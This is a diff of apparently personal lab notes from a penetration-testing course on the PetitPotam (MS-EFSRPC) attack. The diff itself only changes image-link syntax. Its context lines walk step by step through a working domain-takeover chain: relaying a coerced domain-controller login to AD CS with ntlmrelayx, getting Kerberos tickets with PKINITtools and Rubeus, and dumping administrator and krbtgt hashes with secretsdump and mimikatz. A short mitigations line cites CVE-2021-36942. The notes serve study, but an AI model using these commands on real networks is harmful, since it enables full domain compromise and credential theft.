@@ -14,7 +14,7 @@ set up ntlmrelayx
 ```JavaScript
 ntlmrelayx.py -debug -smb2support --target http://<ADCS_name>.<DOMAIN>/certsrv/certfnsh.asp --adcs --template DomainController
 ```
-![[../../assets/PetitPotam (MS-EFSRPC)/image 368.png|image 368.png]]
+![image 368.png](../../assets/PetitPotam%20(MS-EFSRPC)/image%20368.png)
   
 run [petitpotam.py](http://petitpotam.py) to attempt to coerce the DC to authenticate our host where ntlmrelayx is running
 - can use mimikatz with “misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>”
@@ -22,11 +22,11 @@ run [petitpotam.py](http://petitpotam.py) to attempt to coerce the DC to authent
 ```JavaScript
 python3 PetitPotam.py <attacker_IP> <IP>
 ```
-![[../../assets/PetitPotam (MS-EFSRPC)/image 1 276.png|image 1 276.png]]
+![image 1 276.png](../../assets/PetitPotam%20(MS-EFSRPC)/image%201%20276.png)
   
 catch the base64 encoded certificate with ntlmrelayx
 - no comand to run here, just have ntlmrelayx running
-![[../../assets/PetitPotam (MS-EFSRPC)/image 2 235.png|image 2 235.png]]
+![image 2 235.png](../../assets/PetitPotam%20(MS-EFSRPC)/image%202%20235.png)
   
 once we have the certificate, there are several paths we can take (denoted by different headers)
 ## Use DC TGT to DC Sync
@@ -34,7 +34,7 @@ request TGT using gettgtpkinit.py
 ```JavaScript
 python3 /opt/PKINITtools/gettgtpkinit.py <DOMAIN>/<DC_name>\$ -pfx-base64 <base64_cert> dc.ccache
 ```
-![[../../assets/PetitPotam (MS-EFSRPC)/image 3 203.png|image 3 203.png]]
+![image 3 203.png](../../assets/PetitPotam%20(MS-EFSRPC)/image%203%20203.png)
   
 set up KRB5CCNAME env variable
 ```JavaScript
@@ -45,7 +45,7 @@ export KRB5CCNAME=dc.ccache
 ```JavaScript
 secretsdump.py -just-dc-user <DOMAIN>/administrator -k -no-pass "<DC_name>$"@<DC_name>.<DOMAIN>
 ```
-![[../../assets/PetitPotam (MS-EFSRPC)/image 4 178.png|image 4 178.png]]
+![image 4 178.png](../../assets/PetitPotam%20(MS-EFSRPC)/image%204%20178.png)
   
 secretsdump
 ```JavaScript
@@ -58,7 +58,7 @@ can also submit a TGS request for ourselves using getnthash.py
 ```JavaScript
 python /opt/PKINITtools/getnthash.py -key <key> <DOMAIN>/<DC_name>$
 ```
-![[../../assets/PetitPotam (MS-EFSRPC)/image 5 166.png|image 5 166.png]]
+![image 5 166.png](../../assets/PetitPotam%20(MS-EFSRPC)/image%205%20166.png)
   
 secretsdump with NTLM hash
 ```JavaScript
@@ -69,17 +69,17 @@ once we get the base64 certificate, we can just use that to submit a request for
 ```JavaScript
 .\Rubeus.exe asktgt /user:<DC_name>$$ /certificate:<base64_cert> /ptt
 ```
-![[../../assets/PetitPotam (MS-EFSRPC)/image 6 143.png|image 6 143.png]]
+![image 6 143.png](../../assets/PetitPotam%20(MS-EFSRPC)/image%206%20143.png)
   
 confirm ticket is in memory using klist
-![[../../assets/PetitPotam (MS-EFSRPC)/image 7 134.png|image 7 134.png]]
+![image 7 134.png](../../assets/PetitPotam%20(MS-EFSRPC)/image%207%20134.png)
   
 use mimikatz to dump hashes
 ```JavaScript
 lsadump::dcsync /user:<DOMAIN>\krbtgt
 ```
 - in their example, they just use “inlanefreight”, not “inlanefreight.local”
-![[../../assets/PetitPotam (MS-EFSRPC)/image 8 117.png|image 8 117.png]]
+![image 8 117.png](../../assets/PetitPotam%20(MS-EFSRPC)/image%208%20117.png)
   
 # Mitigations
 - patch from CVE-2021-36942
